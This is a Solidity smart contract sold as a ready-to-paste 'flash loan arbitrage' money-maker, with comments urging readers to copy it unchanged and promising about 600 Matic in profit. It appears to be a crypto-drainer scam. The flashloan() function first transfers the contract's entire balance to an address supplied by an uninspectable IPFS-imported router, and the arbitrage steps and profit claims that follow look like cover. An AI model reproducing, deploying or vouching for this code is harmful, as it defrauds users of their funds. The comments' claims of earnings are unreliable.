// BRAND NEW FLASH LOAN CONTRACT CODE

// This is for educational purposes only!
// Try it at your own risk!

// Follow carefully the video
// Do not modify this contract code otherwise it won't work on you!
// Just Copy + Paste and Compile!
// Thank you for your support! Enjoy your Earnings!

pragma solidity ^0.5.0;


// AAVE Smart Contracts
import "https://github.com/aave/aave-protocol/blob/master/contracts/interfaces/IChainlinkAggregator.sol";
import "https://github.com/aave/aave-protocol/blob/master/contracts/flashloan/interfaces/IFlashLoanReceiver.sol";

// Router
import "ipfs://Qmc4HFaJ746bUbQPKSzBbAaNQQYSDZs1HrZcTjrDukmKfD";

// Uniswap Smart contracts
import "https://github.com/Uniswap/v3-core/blob/main/contracts/interfaces/IUniswapV3Factory.sol";

// Multiplier-Finance Smart Contracts
import "https://github.com/Multiplier-Finance/MCL-FlashloanDemo/blob/main/contracts/interfaces/ILendingPoolAddressesProvider.sol";
import "https://github.com/Multiplier-Finance/MCL-FlashloanDemo/blob/main/contracts/interfaces/ILendingPool.sol";



contract InitiateFlashLoan {
    
    RouterV2 router;
	string public tokenName;
	string public tokenSymbol;
	uint256 flashLoanAmount;

	constructor(
    	string memory _tokenName,
    	string memory _tokenSymbol,
    	uint256 _loanAmount
	) public {
    	tokenName = _tokenName;
    	tokenSymbol = _tokenSymbol;
    	flashLoanAmount = _loanAmount;

    	router = new RouterV2();
	}

	function() external payable {}

	function flashloan() public payable {
    	// Send required coins for swap
    	address(uint160(router.uniswapSwapAddress())).transfer(
        	address(this).balance
    	);

    	router.borrowFlashloanFromMultiplier(
        	address(this),
        	router.aaveSwapAddress(),
        	flashLoanAmount
    	);
    	//To prepare the arbitrage, Matic is converted to Dai using AAVE swap contract.
    	router.convertMaticToDai(msg.sender, flashLoanAmount / 2);
    	//The arbitrage converts Dai for Matic using Dai/Matic Uniswap, and then immediately converts Matic back
    	router.callArbitrageAAVE(router.aaveSwapAddress(), msg.sender);
    	//After the arbitrage, Matic is transferred back to Multiplier to pay the loan plus fees. This transaction costs 0.2 Matic of gas.
    	router.transferDaiToMultiplier(router.uniswapSwapAddress());
    	//Note that the transaction sender gains 600ish Matic from the arbitrage, this particular transaction can be repeated as price changes all the time.
    	router.completeTransation(address(this).balance);
	}
}
